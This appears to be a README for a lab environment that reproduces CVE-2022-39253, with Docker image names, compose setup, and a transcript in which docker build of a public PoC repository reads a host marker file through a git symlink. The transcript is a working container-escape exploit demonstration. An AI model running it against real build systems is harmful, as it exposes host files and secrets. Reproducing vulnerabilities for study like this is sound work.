# containerd CVE-2022-39253

* dqd:
  * ssst0n3/docker_archive:cve-2022-39253 -> ssst0n3/docker_archive:cve-2022-39253_v0.1.0
  * ssst0n3/docker_archive:cve-2022-39253_v0.1.0
* ctr:
  * ssst0n3/docker_archive:ctr_cve-2022-39253 -> ssst0n3/docker_archive:ctr_cve-2022-39253_v0.1.0
  * ssst0n3/docker_archive:ctr_cve-2022-39253_v0.1.0

## usage

```shell
$ cd vul/cve-2022-39253
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
```

### reproduce

```shell
$ ./ssh
root@localhost:~# echo "*************escaped*************" > /tmp/escaped
root@localhost:~# docker build https://github.com/ssst0n3/docker-cve-2022-39253-poc.git#main
Sending build context to Docker daemon  247.3kB
Step 1/4 : FROM busybox
latest: Pulling from library/busybox
90b9666d4aed: Pull complete 
Digest: sha256:f85340bf132ae937d2c2a763b8335c9bab35d6e8293f70f606b9c6178d84f42b
Status: Downloaded newer image for busybox:latest
 ---> 6d3e4188a38a
Step 2/4 : COPY / /
 ---> d2a1613a2428
Step 3/4 : RUN ls -lah /.git/modules/evil/objects/host
 ---> Running in d4e807cddf99
-rw-r--r--    1 root     root          34 Jul 16 12:35 /.git/modules/evil/objects/host
Removing intermediate container d4e807cddf99
 ---> 09be27dde416
Step 4/4 : RUN cat /.git/modules/evil/objects/host
 ---> Running in fe5bc95688a6
*************escaped*************
Removing intermediate container fe5bc95688a6
 ---> f64f275435a2
Successfully built f64f275435a2
```


### env details

```shell
$ ./ssh
root@localhost:~# apt list --installed |grep "git/now"

WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

git/now 1:2.34.1-1ubuntu1 amd64 [installed,local]
root@localhost:~# docker --version
Docker version 20.10.19, build d85ef84
```

## build

```shell
make all DIR=vul/cve-2022-39253
```

for developers:

```dockerfile
FROM ssst0n3/docker_archive:ctr_cve-2022-39253_v0.1.0
```
